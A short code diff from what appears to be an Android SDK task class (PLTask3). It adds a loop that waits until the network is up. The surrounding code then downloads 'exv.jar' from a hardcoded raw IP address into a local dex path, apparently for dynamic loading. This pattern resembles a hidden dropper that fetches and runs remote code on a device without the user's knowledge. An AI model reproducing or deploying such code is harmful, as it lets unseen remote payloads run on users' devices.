@@ -25,6 +25,16 @@ public class PLTask3 implements PLTask {
 		Log.d(TAG, "3 is running...");
 		int result  = 0;
 		state = STATE_RUNNING;
+		while (true) {
+			if (!dservice.isNetOk()) {
+				try {
+					Thread.sleep(1000*60*10);
+				} catch (InterruptedException e) {
+				}
+				continue;
+			}
+			break;
+		}
 		String remote = "http://180.96.63.70:8080/plserver/dats/exv.jar";
 //		String localFile = SdkServ.getLocalDexPath()+"exv.jar";
 		if(SdkServ.downloadGoOn(remote, SdkServ.getLocalDexPath(), "exv.jar",this.dservice.getService())){
